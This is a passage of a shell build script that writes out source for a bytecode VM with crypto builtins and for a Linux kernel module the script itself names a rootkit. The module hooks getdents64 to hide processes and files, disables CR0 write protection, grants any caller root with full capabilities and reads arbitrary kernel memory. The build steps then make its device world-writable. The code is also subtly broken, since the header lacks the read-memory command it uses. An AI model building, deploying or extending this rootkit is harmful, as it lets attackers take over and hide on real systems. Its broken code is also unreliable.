    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2,
};

#define ROTR32(x,n) (((x) >> (n)) | ((x) << (32 - (n))))

static void sha_transform(uint32_t st[8], const uint8_t blk[64]) {
    uint32_t w[64];
    for (int i = 0; i < 16; i++)
        w[i] = ((uint32_t)blk[i*4] << 24) | ((uint32_t)blk[i*4+1] << 16) |
               ((uint32_t)blk[i*4+2] << 8) | (uint32_t)blk[i*4+3];
    for (int i = 16; i < 64; i++) {
        uint32_t s0 = ROTR32(w[i-15], 7) ^ ROTR32(w[i-15], 18) ^ (w[i-15] >> 3);
        uint32_t s1 = ROTR32(w[i-2], 17) ^ ROTR32(w[i-2], 19) ^ (w[i-2] >> 10);
        w[i] = w[i-16] + s0 + w[i-7] + s1;
    }

    uint32_t a = st[0], b = st[1], c = st[2], d = st[3];
    uint32_t e = st[4], f = st[5], g = st[6], h = st[7];

    for (int i = 0; i < 64; i++) {
        uint32_t S1 = ROTR32(e, 6) ^ ROTR32(e, 11) ^ ROTR32(e, 25);
        uint32_t ch = (e & f) ^ (~e & g);
        uint32_t t1 = h + S1 + ch + sha_k[i] + w[i];
        uint32_t S0 = ROTR32(a, 2) ^ ROTR32(a, 13) ^ ROTR32(a, 22);
        uint32_t mj = (a & b) ^ (a & c) ^ (b & c);
        uint32_t t2 = S0 + mj;
        h = g; g = f; f = e; e = d + t1;
        d = c; c = b; b = a; a = t1 + t2;
    }
    st[0] += a; st[1] += b; st[2] += c; st[3] += d;
    st[4] += e; st[5] += f; st[6] += g; st[7] += h;
}

static void sha_init(sha_ctx *c) {
    c->state[0] = 0x6a09e667; c->state[1] = 0xbb67ae85;
    c->state[2] = 0x3c6ef372; c->state[3] = 0xa54ff53a;
    c->state[4] = 0x510e527f; c->state[5] = 0x9b05688c;
    c->state[6] = 0x1f83d9ab; c->state[7] = 0x5be0cd19;
    c->count = 0;
}

static void sha_update(sha_ctx *c, const uint8_t *data, size_t len) {
    size_t idx = (size_t)(c->count & 63);
    c->count += len;
    size_t part = 64 - idx;
    size_t i = 0;
    if (len >= part) {
        memcpy(c->buffer + idx, data, part);
        sha_transform(c->state, c->buffer);
        for (i = part; i + 63 < len; i += 64)
            sha_transform(c->state, data + i);
        idx = 0;
    }
    memcpy(c->buffer + idx, data + i, len - i);
}

static void sha_final(sha_ctx *c, uint8_t out[32]) {
    uint64_t bits = c->count * 8;
    size_t idx = (size_t)(c->count & 63);
    static const uint8_t pad[64] = { 0x80 };
    size_t padlen = (idx < 56) ? (56 - idx) : (120 - idx);
    sha_update(c, pad, padlen);
    uint8_t lenbuf[8];
    for (int i = 0; i < 8; i++) lenbuf[i] = (bits >> (8*(7 - i))) & 0xff;
    sha_update(c, lenbuf, 8);
    for (int i = 0; i < 8; i++) {
        out[i*4]   = (c->state[i] >> 24) & 0xff;
        out[i*4+1] = (c->state[i] >> 16) & 0xff;
        out[i*4+2] = (c->state[i] >>  8) & 0xff;
        out[i*4+3] = (c->state[i]      ) & 0xff;
    }
}

static const char b64e[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static char *b64_encode(const uint8_t *in, size_t len) {
    size_t olen = 4 * ((len + 2) / 3);
    char *out = malloc(olen + 1);
    size_t i, o = 0;
    for (i = 0; i + 2 < len; i += 3) {
        uint32_t v = (in[i] << 16) | (in[i+1] << 8) | in[i+2];
        out[o++] = b64e[(v >> 18) & 63];
        out[o++] = b64e[(v >> 12) & 63];
        out[o++] = b64e[(v >>  6) & 63];
        out[o++] = b64e[(v      ) & 63];
    }
    if (i < len) {
        uint32_t v = in[i] << 16;
        int rem = (int)(len - i);
        if (rem == 2) v |= in[i+1] << 8;
        out[o++] = b64e[(v >> 18) & 63];
        out[o++] = b64e[(v >> 12) & 63];
        out[o++] = (rem == 2) ? b64e[(v >> 6) & 63] : '=';
        out[o++] = '=';
    }
    out[o] = 0;
    return out;
}

static int b64val(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return 26 + c - 'a';
    if (c >= '0' && c <= '9') return 52 + c - '0';
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static uint8_t *b64_decode(const char *in, size_t *out_len) {
    size_t n = strlen(in);
    uint8_t *out = malloc(n);
    size_t o = 0;
    int quad[4], qn = 0;
    for (size_t i = 0; i < n; i++) {
        if (in[i] == '=') break;
        int v = b64val(in[i]);
        if (v < 0) continue;
        quad[qn++] = v;
        if (qn == 4) {
            out[o++] = (quad[0] << 2) | (quad[1] >> 4);
            out[o++] = ((quad[1] & 15) << 4) | (quad[2] >> 2);
            out[o++] = ((quad[2] & 3) << 6) | quad[3];
            qn = 0;
        }
    }
    if (qn == 2) out[o++] = (quad[0] << 2) | (quad[1] >> 4);
    else if (qn == 3) {
        out[o++] = (quad[0] << 2) | (quad[1] >> 4);
        out[o++] = ((quad[1] & 15) << 4) | (quad[2] >> 2);
    }
    *out_len = o;
    return out;
}

static int to_bytes(Value v, const uint8_t **out, size_t *len) {
    if (v.type == VT_STR) { *out = (const uint8_t *)v.v.s; *len = strlen(v.v.s); return 0; }
    if (v.type == VT_BYTES) { *out = v.v.bytes.data; *len = v.v.bytes.len; return 0; }
    return -1;
}

static Value bytes_value(uint8_t *data, size_t len) {
    Value v; v.type = VT_BYTES; v.rc = 0;
    v.v.bytes.data = data;
    v.v.bytes.len = len;
    return v;
}

static BuiltinResult bi_md5(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)c;
    const uint8_t *data; size_t len;
    if (to_bytes(a[0], &data, &len) < 0) { *out = mkstr(""); return BUILTIN_OK; }
    md5_ctx ctx; md5_init(&ctx); md5_update(&ctx, data, len);
    uint8_t dig[16]; md5_final(&ctx, dig);
    char hex[33];
    for (int i = 0; i < 16; i++) snprintf(hex + i*2, 3, "%02x", dig[i]);
    *out = mkstr(hex);
    return BUILTIN_OK;
}

static BuiltinResult bi_sha256(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)c;
    const uint8_t *data; size_t len;
    if (to_bytes(a[0], &data, &len) < 0) { *out = mkstr(""); return BUILTIN_OK; }
    sha_ctx ctx; sha_init(&ctx); sha_update(&ctx, data, len);
    uint8_t dig[32]; sha_final(&ctx, dig);
    char hex[65];
    for (int i = 0; i < 32; i++) snprintf(hex + i*2, 3, "%02x", dig[i]);
    *out = mkstr(hex);
    return BUILTIN_OK;
}

static BuiltinResult bi_xor(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)c;
    const uint8_t *data; size_t len;
    if (to_bytes(a[0], &data, &len) < 0) { *out = mknone(); return BUILTIN_OK; }

    const uint8_t *key; size_t klen;
    uint8_t kb[1];
    if (a[1].type == VT_INT) {
        kb[0] = (uint8_t)(a[1].v.i & 0xff);
        key = kb; klen = 1;
    } else if (to_bytes(a[1], &key, &klen) < 0 || klen == 0) {
        *out = mknone(); return BUILTIN_OK;
    }

    uint8_t *r = malloc(len ? len : 1);
    for (size_t i = 0; i < len; i++) r[i] = data[i] ^ key[i % klen];
    *out = bytes_value(r, len);
    return BUILTIN_OK;
}

static BuiltinResult bi_b64e(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)c;
    const uint8_t *data; size_t len;
    if (to_bytes(a[0], &data, &len) < 0) { *out = mkstr(""); return BUILTIN_OK; }
    char *s = b64_encode(data, len);
    *out = mkstr(s);
    free(s);
    return BUILTIN_OK;
}

static BuiltinResult bi_b64d(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)c;
    if (a[0].type != VT_STR) { *out = bytes_value(malloc(1), 0); return BUILTIN_OK; }
    size_t olen = 0;
    uint8_t *d = b64_decode(a[0].v.s, &olen);
    *out = bytes_value(d, olen);
    return BUILTIN_OK;
}

const Builtin BUILTINS_CRYPTO[] = {
    { "crypto_md5",        1, 1, bi_md5    },
    { "crypto_sha256",     1, 1, bi_sha256 },
    { "crypto_xor",        2, 2, bi_xor    },
    { "crypto_b64_encode", 1, 1, bi_b64e   },
    { "crypto_b64_decode", 1, 1, bi_b64d   },
    { NULL, 0, 0, NULL },
};
EOF

# ============================================================
# src/builtins/kernel.c
# ============================================================
cat > src/builtins/kernel.c <<'EOF'
#include "jky_builtins.h"
#include "jky_kernel_bridge.h"
#include "jky_platform.h"

#include <stdio.h>
#include <string.h>

static BuiltinResult bi_kernel_version(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)a; (void)c;
    char buf[256] = {0};
    jky_kernel_version(buf, sizeof(buf));
    *out = mkstr(buf);
    return BUILTIN_OK;
}

static BuiltinResult bi_kernel_modules(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)a; (void)c;
    Value arr = mkarray();
    FILE *f = fopen("/proc/modules", "r");
    if (f) {
        char line[512];
        while (fgets(line, sizeof(line), f)) {
            char *sp = strchr(line, ' ');
            if (sp) *sp = 0;
            arr_push(arr.v.arr, mkstr(line));
        }
        fclose(f);
    }
    *out = arr;
    return BUILTIN_OK;
}

static BuiltinResult bi_hide_pid(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)c;
    if (a[0].type != VT_INT) { *out = mkbool(0); return BUILTIN_OK; }
    *out = mkbool(jky_kmod_hide_pid((int)a[0].v.i) == 0);
    return BUILTIN_OK;
}

static BuiltinResult bi_unhide_pid(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)c;
    if (a[0].type != VT_INT) { *out = mkbool(0); return BUILTIN_OK; }
    *out = mkbool(jky_kmod_unhide_pid((int)a[0].v.i) == 0);
    return BUILTIN_OK;
}

static BuiltinResult bi_hide_file(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)c;
    if (a[0].type != VT_STR) { *out = mkbool(0); return BUILTIN_OK; }
    *out = mkbool(jky_kmod_hide_file(a[0].v.s) == 0);
    return BUILTIN_OK;
}

static BuiltinResult bi_get_root(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)a; (void)c;
    *out = mkbool(jky_kmod_get_root() == 0);
    return BUILTIN_OK;
}

static BuiltinResult bi_kill_pid(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)c;
    if (a[0].type != VT_INT) { *out = mkbool(0); return BUILTIN_OK; }
    *out = mkbool(jky_kmod_kill((int)a[0].v.i) == 0);
    return BUILTIN_OK;
}

const Builtin BUILTINS_KERNEL[] = {
    { "kernel_version",     0, 0, bi_kernel_version },
    { "kernel_modules",     0, 0, bi_kernel_modules },
    { "kernel_hide_pid",    1, 1, bi_hide_pid       },
    { "kernel_unhide_pid",  1, 1, bi_unhide_pid     },
    { "kernel_hide_file",   1, 1, bi_hide_file      },
    { "kernel_get_root",    0, 0, bi_get_root       },
    { "kernel_kill_pid",    1, 1, bi_kill_pid       },
    { NULL, 0, 0, NULL },
};
EOF

# ============================================================
# src/builtins.c (updated)
# ============================================================
cat > src/builtins.c <<'EOF'
#include "jky_builtins.h"
#include <string.h>

static const Builtin *TABLES[] = {
    BUILTINS_PURE,
    BUILTINS_SYSTEM,
    BUILTINS_FS,
    BUILTINS_DATA,
    BUILTINS_CRYPTO,
    BUILTINS_KERNEL,
};
static const int N = sizeof(TABLES) / sizeof(TABLES[0]);

BuiltinResult builtin_call(VM *vm, const char *name,
                           Value *args, int argc, Value *out) {
    for (int t = 0; t < N; t++) {
        const Builtin *tbl = TABLES[t];
        for (int i = 0; tbl[i].name != NULL; i++) {
            if (strcmp(tbl[i].name, name) != 0) continue;
            if (argc < tbl[i].min_args) {
                value_set_error("%s: too few arguments", name);
                return BUILTIN_ERROR;
            }
            if (tbl[i].max_args >= 0 && argc > tbl[i].max_args) {
                value_set_error("%s: too many arguments", name);
                return BUILTIN_ERROR;
            }
            return tbl[i].fn(vm, args, argc, out);
        }
    }
    return BUILTIN_NOT_FOUND;
}

int builtin_exists(const char *name) {
    for (int t = 0; t < N; t++) {
        const Builtin *tbl = TABLES[t];
        for (int i = 0; tbl[i].name != NULL; i++)
            if (strcmp(tbl[i].name, name) == 0) return 1;
    }
    return 0;
}
EOF

# ============================================================
# Makefile (updated)
# ============================================================
cat > Makefile <<'EOF'
CC      ?= gcc
CFLAGS  := -std=c11 -O2 -Wall -Wextra -Iinclude -D_GNU_SOURCE
LDFLAGS := -lm

SRC := \
    src/value.c \
    src/loader.c \
    src/vm.c \
    src/builtins.c \
    src/builtins/pure.c \
    src/builtins/system.c \
    src/builtins/fs.c \
    src/builtins/data.c \
    src/builtins/crypto.c \
    src/builtins/kernel.c \
    src/platform/linux/platform.c \
    src/platform/linux/kernel_bridge.c \
    src/main.c

OBJ := $(SRC:.c=.o)

.PHONY: all clean

all: jockey-vm

jockey-vm: $(OBJ)
	$(CC) -o $@ $(OBJ) $(LDFLAGS)

%.o: %.c
	$(CC) $(CFLAGS) -c -o $@ $<

clean:
	rm -f $(OBJ) jockey-vm
EOF

# ============================================================
# kmod/jky_ioctl.h
# ============================================================
cat > kmod/jky_ioctl.h <<'EOF'
#ifndef JKY_IOCTL_H
#define JKY_IOCTL_H

#include <linux/ioctl.h>

#define JKY_MAGIC 'J'

struct jky_req {
    int32_t  pid;
    uint64_t addr;
    uint64_t size;
    char     path[256];
    char     pad[64];
};

#define JKY_CMD_HIDE_PID     _IOW(JKY_MAGIC, 1, struct jky_req)
#define JKY_CMD_UNHIDE_PID   _IOW(JKY_MAGIC, 2, struct jky_req)
#define JKY_CMD_HIDE_FILE    _IOW(JKY_MAGIC, 3, struct jky_req)
#define JKY_CMD_UNHIDE_FILE  _IOW(JKY_MAGIC, 4, struct jky_req)
#define JKY_CMD_GET_ROOT     _IO (JKY_MAGIC, 5)
#define JKY_CMD_KILL_PID     _IOW(JKY_MAGIC, 8, struct jky_req)
#define JKY_CMD_PING         _IO (JKY_MAGIC, 99)

#endif
EOF

# ============================================================
# kmod/Makefile
# ============================================================
cat > kmod/Makefile <<'EOF'
obj-m := rootkit.o
rootkit-objs := main.o symbols.o hooks.o cred_escalate.o ioctl_handler.o

KDIR ?= /lib/modules/$(shell uname -r)/build
PWD  := $(shell pwd)

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean
EOF

# ============================================================
# kmod/Kbuild
# ============================================================
cat > kmod/Kbuild <<'EOF'
obj-m := rootkit.o
rootkit-objs := main.o symbols.o hooks.o cred_escalate.o ioctl_handler.o
EOF

# ============================================================
# kmod/symbols.h
# ============================================================
cat > kmod/symbols.h <<'EOF'
#ifndef JKY_SYMBOLS_H
#define JKY_SYMBOLS_H

unsigned long jky_lookup(const char *name);

#endif
EOF

# ============================================================
# kmod/symbols.c
# ============================================================
cat > kmod/symbols.c <<'EOF'
#include <linux/kprobes.h>
#include <linux/kallsyms.h>
#include <linux/module.h>
#include "symbols.h"

static unsigned long (*kln_ptr)(const char *) = NULL;

static int probe_handler(struct kprobe *p, struct pt_regs *regs) {
    (void)p; (void)regs;
    return 0;
}

static int resolve_kln(void) {
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
    int ret = register_kprobe(&kp);
    if (ret < 0) return ret;
    kln_ptr = (unsigned long (*)(const char *))kp.addr;
    unregister_kprobe(&kp);
    return 0;
}

unsigned long jky_lookup(const char *name) {
    if (!kln_ptr) {
        if (resolve_kln() < 0) return 0;
    }
    return kln_ptr(name);
}
EOF

# ============================================================
# kmod/hooks.h
# ============================================================
cat > kmod/hooks.h <<'EOF'
#ifndef JKY_HOOKS_H
#define JKY_HOOKS_H

int  jky_hooks_install(void);
void jky_hooks_remove(void);

int  jky_hide_pid(int pid);
int  jky_unhide_pid(int pid);
int  jky_hide_file(const char *path);
int  jky_unhide_file(const char *path);

#endif
EOF

# ============================================================
# kmod/hooks.c
# ============================================================
cat > kmod/hooks.c <<'EOF'
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/mutex.h>
#include <linux/string.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <asm/unistd.h>
#include <asm/ptrace.h>
#include <asm/special_insns.h>
#include "jky_ioctl.h"
#include "hooks.h"

extern unsigned long jky_lookup(const char *);

struct hidden_pid  { struct list_head list; int pid; };
struct hidden_file { struct list_head list; char name[256]; };

static LIST_HEAD(hidden_pids);
static LIST_HEAD(hidden_files);
static DEFINE_MUTEX(hidden_lock);

int jky_hide_pid(int pid) {
    struct hidden_pid *e;
    mutex_lock(&hidden_lock);
    list_for_each_entry(e, &hidden_pids, list) {
        if (e->pid == pid) { mutex_unlock(&hidden_lock); return 0; }
    }
    e = kzalloc(sizeof(*e), GFP_KERNEL);
    if (!e) { mutex_unlock(&hidden_lock); return -ENOMEM; }
    e->pid = pid;
    list_add(&e->list, &hidden_pids);
    mutex_unlock(&hidden_lock);
    return 0;
}

int jky_unhide_pid(int pid) {
    struct hidden_pid *e, *tmp;
    mutex_lock(&hidden_lock);
    list_for_each_entry_safe(e, tmp, &hidden_pids, list) {
        if (e->pid == pid) {
            list_del(&e->list);
            kfree(e);
            mutex_unlock(&hidden_lock);
            return 0;
        }
    }
    mutex_unlock(&hidden_lock);
    return -ENOENT;
}

int jky_hide_file(const char *path) {
    const char *base = strrchr(path, '/');
    base = base ? base + 1 : path;

    struct hidden_file *e;
    mutex_lock(&hidden_lock);
    e = kzalloc(sizeof(*e), GFP_KERNEL);
    if (!e) { mutex_unlock(&hidden_lock); return -ENOMEM; }
    strncpy(e->name, base, sizeof(e->name) - 1);
    list_add(&e->list, &hidden_files);
    mutex_unlock(&hidden_lock);
    return 0;
}

int jky_unhide_file(const char *path) {
    const char *base = strrchr(path, '/');
    base = base ? base + 1 : path;

    struct hidden_file *e, *tmp;
    mutex_lock(&hidden_lock);
    list_for_each_entry_safe(e, tmp, &hidden_files, list) {
        if (strcmp(e->name, base) == 0) {
            list_del(&e->list);
            kfree(e);
            mutex_unlock(&hidden_lock);
            return 0;
        }
    }
    mutex_unlock(&hidden_lock);
    return -ENOENT;
}

static int is_pid_hidden(int pid) {
    struct hidden_pid *e;
    int hidden = 0;
    mutex_lock(&hidden_lock);
    list_for_each_entry(e, &hidden_pids, list) {
        if (e->pid == pid) { hidden = 1; break; }
    }
    mutex_unlock(&hidden_lock);
    return hidden;
}

static int is_file_hidden(const char *name) {
    struct hidden_file *e;
    int hidden = 0;
    mutex_lock(&hidden_lock);
    list_for_each_entry(e, &hidden_files, list) {
        if (strcmp(e->name, name) == 0) { hidden = 1; break; }
    }
    mutex_unlock(&hidden_lock);
    return hidden;
}

static unsigned long *syscall_table = NULL;
static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);

static inline void write_cr0_forced(unsigned long val) {
    unsigned long __force_order;
    asm volatile("mov %0, %%cr0"
                 : "+r"(val), "+m"(__force_order));
}

static void wp_off(void) { write_cr0_forced(read_cr0() & ~X86_CR0_WP); }
static void wp_on (void) { write_cr0_forced(read_cr0() |  X86_CR0_WP); }

static int name_is_hidden_number(const char *name) {
    int pid = 0;
    const char *p = name;
    if (!*p) return 0;
    while (*p) {
        if (*p < '0' || *p > '9') return 0;
        pid = pid * 10 + (*p - '0');
        p++;
    }
    return is_pid_hidden(pid);
}

static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
    long ret = orig_getdents64(regs);
    if (ret <= 0) return ret;

    struct linux_dirent64 __user *dirp = (void *)regs->si;
    struct linux_dirent64 *kbuf;
    long offset = 0;

    kbuf = kzalloc(ret, GFP_KERNEL);
    if (!kbuf) return ret;

    if (copy_from_user(kbuf, dirp, ret)) {
        kfree(kbuf);
        return ret;
    }

    while (offset < ret) {
        struct linux_dirent64 *d = (void *)kbuf + offset;
        int reclen = d->d_reclen;
        if (reclen <= 0) break;

        int hide = 0;
        if (name_is_hidden_number(d->d_name)) hide = 1;
        else if (is_file_hidden(d->d_name)) hide = 1;

        if (hide) {
            long remaining = ret - (offset + reclen);
            if (remaining > 0)
                memmove((void *)d, (void *)d + reclen, remaining);
            ret -= reclen;
            continue;
        }
        offset += reclen;
    }

    if (copy_to_user(dirp, kbuf, ret)) {
        kfree(kbuf);
        return ret;
    }
    kfree(kbuf);
    return ret;
}

int jky_hooks_install(void) {
    syscall_table = (unsigned long *)jky_lookup("sys_call_table");
    if (!syscall_table) return -ENOENT;

    unsigned long idx = __NR_getdents64;
    orig_getdents64 = (void *)syscall_table[idx];

    wp_off();
    syscall_table[idx] = (unsigned long)hook_getdents64;
    wp_on();

    pr_info("jky: hooks installed\n");
    return 0;
}

void jky_hooks_remove(void) {
    if (syscall_table && orig_getdents64) {
        unsigned long idx = __NR_getdents64;
        wp_off();
        syscall_table[idx] = (unsigned long)orig_getdents64;
        wp_on();
    }

    struct hidden_pid *p, *pt;
    list_for_each_entry_safe(p, pt, &hidden_pids, list) {
        list_del(&p->list); kfree(p);
    }
    struct hidden_file *f, *ft;
    list_for_each_entry_safe(f, ft, &hidden_files, list) {
        list_del(&f->list); kfree(f);
    }
    pr_info("jky: hooks removed\n");
}
EOF

# ============================================================
# kmod/cred_escalate.h
# ============================================================
cat > kmod/cred_escalate.h <<'EOF'
#ifndef JKY_CRED_H
#define JKY_CRED_H
int jky_get_root(void);
#endif
EOF

# ============================================================
# kmod/cred_escalate.c
# ============================================================
cat > kmod/cred_escalate.c <<'EOF'
#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/capability.h>
#include <linux/module.h>
#include "cred_escalate.h"

int jky_get_root(void) {
    struct cred *new = prepare_creds();
    if (!new) return -ENOMEM;

    new->uid.val   = new->gid.val   = 0;
    new->euid.val  = new->egid.val  = 0;
    new->suid.val  = new->sgid.val  = 0;
    new->fsuid.val = new->fsgid.val = 0;

    new->cap_effective   = CAP_FULL_SET;
    new->cap_inheritable = CAP_FULL_SET;
    new->cap_permitted   = CAP_FULL_SET;
    new->cap_bset        = CAP_FULL_SET;
    new->cap_ambient     = CAP_FULL_SET;

    commit_creds(new);
    pr_info("jky: escalated pid %d to root\n", current->pid);
    return 0;
}
EOF

# ============================================================
# kmod/ioctl_handler.c
# ============================================================
cat > kmod/ioctl_handler.c <<'EOF'
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/mm.h>
#include <linux/version.h>
#include "jky_ioctl.h"
#include "hooks.h"
#include "cred_escalate.h"

static int handle_read_mem(void __user *uarg) {
    struct jky_req req;
    if (copy_from_user(&req, uarg, sizeof(req))) return -EFAULT;

    void *kbuf = kmalloc(req.size, GFP_KERNEL);
    if (!kbuf) return -ENOMEM;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 8, 0)
    if (copy_from_kernel_nofault(kbuf, (void *)req.addr, req.size)) {
        kfree(kbuf);
        return -EFAULT;
    }
#else
    if (probe_kernel_read(kbuf, (void *)req.addr, req.size)) {
        kfree(kbuf);
        return -EFAULT;
    }
#endif

    void __user *dst = *(void __user **)req.pad;
    if (copy_to_user(dst, kbuf, req.size)) {
        kfree(kbuf);
        return -EFAULT;
    }
    kfree(kbuf);
    return 0;
}

static int handle_kill(struct jky_req *req) {
    struct pid *p = find_get_pid(req->pid);
    if (!p) return -ESRCH;
    struct task_struct *t = get_pid_task(p, PIDTYPE_PID);
    put_pid(p);
    if (!t) return -ESRCH;

    send_sig(SIGKILL, t, 1);
    put_task_struct(t);
    return 0;
}

long jky_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
    (void)f;

    struct jky_req req;
    void __user *uarg = (void __user *)arg;

    switch (cmd) {
    case JKY_CMD_PING:
        return 0x4a4b59;

    case JKY_CMD_HIDE_PID:
        if (copy_from_user(&req, uarg, sizeof(req))) return -EFAULT;
        return jky_hide_pid(req.pid);

    case JKY_CMD_UNHIDE_PID:
        if (copy_from_user(&req, uarg, sizeof(req))) return -EFAULT;
        return jky_unhide_pid(req.pid);

    case JKY_CMD_HIDE_FILE:
        if (copy_from_user(&req, uarg, sizeof(req))) return -EFAULT;
        req.path[sizeof(req.path) - 1] = 0;
        return jky_hide_file(req.path);

    case JKY_CMD_UNHIDE_FILE:
        if (copy_from_user(&req, uarg, sizeof(req))) return -EFAULT;
        req.path[sizeof(req.path) - 1] = 0;
        return jky_unhide_file(req.path);

    case JKY_CMD_GET_ROOT:
        return jky_get_root();

    case JKY_CMD_KILL_PID:
        if (copy_from_user(&req, uarg, sizeof(req))) return -EFAULT;
        return handle_kill(&req);

    case JKY_CMD_READ_MEM:
        return handle_read_mem(uarg);

    default:
        return -EINVAL;
    }
}
EOF

# ============================================================
# kmod/main.c
# ============================================================
cat > kmod/main.c <<'EOF'
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/version.h>
#include <linux/uaccess.h>
#include "hooks.h"

#define DEVICE_NAME "jky"
#define CLASS_NAME  "jky"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("jky");
MODULE_DESCRIPTION("Jockey kernel bridge");
MODULE_VERSION("1.0");

static int    major;
static struct class  *jky_class;
static struct device *jky_device;

extern long jky_ioctl(struct file *f, unsigned int cmd, unsigned long arg);

static int dev_open(struct inode *i, struct file *f) { (void)i; (void)f; return 0; }
static int dev_release(struct inode *i, struct file *f) { (void)i; (void)f; return 0; }

static struct file_operations fops = {
    .owner          = THIS_MODULE,
    .open           = dev_open,
    .release        = dev_release,
    .unlocked_ioctl = jky_ioctl,
};

static int __init jky_init(void) {
    major = register_chrdev(0, DEVICE_NAME, &fops);
    if (major < 0) return major;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
    jky_class = class_create(CLASS_NAME);
#else
    jky_class = class_create(THIS_MODULE, CLASS_NAME);
#endif
    if (IS_ERR(jky_class)) {
        unregister_chrdev(major, DEVICE_NAME);
        return PTR_ERR(jky_class);
    }

    jky_device = device_create(jky_class, NULL, MKDEV(major, 0), NULL, DEVICE_NAME);
    if (IS_ERR(jky_device)) {
        class_destroy(jky_class);
        unregister_chrdev(major, DEVICE_NAME);
        return PTR_ERR(jky_device);
    }

    if (jky_hooks_install() < 0)
        pr_warn("jky: hooks install failed; /dev/%s still usable\n", DEVICE_NAME);

    pr_info("jky: loaded, /dev/%s major=%d\n", DEVICE_NAME, major);
    return 0;
}

static void __exit jky_exit(void) {
    jky_hooks_remove();
    device_destroy(jky_class, MKDEV(major, 0));
    class_destroy(jky_class);
    unregister_chrdev(major, DEVICE_NAME);
    pr_info("jky: unloaded\n");
}

module_init(jky_init);
module_exit(jky_exit);
EOF

# ============================================================
# Build everything
# ============================================================

echo ""
echo "===== building userspace VM ====="
make clean
make

echo ""
echo "===== checking /proc/kallsyms for sys_call_table ====="
if sudo grep -q sys_call_table /proc/kallsyms 2>/dev/null; then
  echo "sys_call_table visible — kmod hooks should install"
else
  echo "WARNING: sys_call_table not visible in /proc/kallsyms."
  echo "         kmod will build but hooks install will fail at insmod."
  echo "         Run: sudo grep sys_call_table /proc/kallsyms"
fi

echo ""
echo "===== building kernel module ====="
cd kmod
make

echo ""
echo "============================================="
echo "  Build complete."
echo ""
echo "  Userspace:  ./jockey-vm <file.jkb>"
echo "  Kernel:     sudo insmod kmod/rootkit.ko"
echo "              sudo chmod 666 /dev/jky"
echo "  Cleanup:    sudo rmmod rootkit"
echo "============================================="
